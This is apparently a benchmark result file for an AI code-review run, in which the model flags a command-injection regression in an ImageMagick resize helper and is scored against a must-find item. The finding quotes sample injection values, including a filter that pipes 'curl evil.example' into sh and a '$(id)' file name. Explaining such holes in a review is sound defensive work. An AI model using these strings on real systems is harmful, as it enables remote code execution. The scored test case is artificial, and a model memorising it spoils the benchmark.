@@ -1,0 +1,95 @@
+{
+  "case": "C070",
+  "pr": "C070",
+  "repo": "fixture",
+  "provider": "grok",
+  "endpoint_kind": "xai",
+  "model": "grok-4.6",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "7695481624f1",
+  "turns": 6,
+  "tool_calls": null,
+  "seconds": 94.4,
+  "setup_seconds": 0.0,
+  "total_seconds": 94.5,
+  "usage": {
+    "in": 67380,
+    "cache_read": 125312,
+    "cache_write": 0,
+    "out": 5878,
+    "source": "cli"
+  },
+  "cost_usd": 0.232684,
+  "changed_files": [
+    "src/images/resize.ts"
+  ],
+  "findings": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity": "critical",
+      "body": "`filter` and `src` are interpolated into a shell command via `exec()`, so a user-composed filter (or a path with `$()`, backticks, or quote-breaking) runs as shell. ImageMagick `-filter` is a single argv token; the previous `execFile` form already treated it that way. A filter such as `Lanczos; curl evil.example | sh`, or `src` of `\"$(id).png\"`, executes on the host.\n\nRestore `execFile` with an argv list and allowlist known filter names:\n\n```suggestion\n    execFile(\"convert\", [src, \"-filter\", filter, \"-resize\", `${w}x`, \"/tmp/out.png\"], (e) => e ? rej(e) : res(\"/tmp/out.png\"));\n```\n\nAlso switch the import back to `execFile` and reject non-numeric `w` before building the resize geometry."
+    }
+  ],
+  "summary": "This change replaces argv-based `execFile` with a shell `exec` that interpolates `src`, `filter`, and `w`. That is command injection on a user-composed filter path, and it is a production-blocking security regression.\n\nImageMagick `-filter` takes a single argument (`Lanczos`, `Mitchell`, etc.). Those values belong in an argv list. Quoted `src` still expands `$()` and backticks inside the shell string. Restore `execFile`, pass `[src, \"-filter\", filter, \"-resize\", f\"{w}x\", \"/tmp/out.png\"]`, and allowlist filter names (and a finite positive integer for `w`) before invoking `convert`.\n\nThe new required middle parameter also breaks the previous `resize(src, w)` contract. The repo has no callers of `resize`, so that break is noted here as context.\n\n**Recommendation:** request-changes",
+  "round": "full",
+  "effective_max_turns": 40,
+  "budget": {
+    "tier": "critical",
+    "profile": "auto",
+    "turns": 40,
+    "alias": "deep",
+    "model": "grok-4.6",
+    "output_tokens": 8192,
+    "verifier_warning_pct": 100,
+    "patch_bytes": 200000,
+    "native_cap_applied": true
+  },
+  "prior_finding_updates": {},
+  "prior_findings_kept": [],
+  "outstanding_verdicts": [],
+  "verification": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The head revision switched from execFile with an argv list to exec() with a shell string that interpolates unquoted filter and double-quoted src, enabling classic command injection (e.g. filter with ; or src with $(...)). That is a real critical RCE regression versus the base code."
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 9.83,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 0,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 1172,
+      "out": 380
+    },
+    "cost_usd": 0.005341
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C070-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
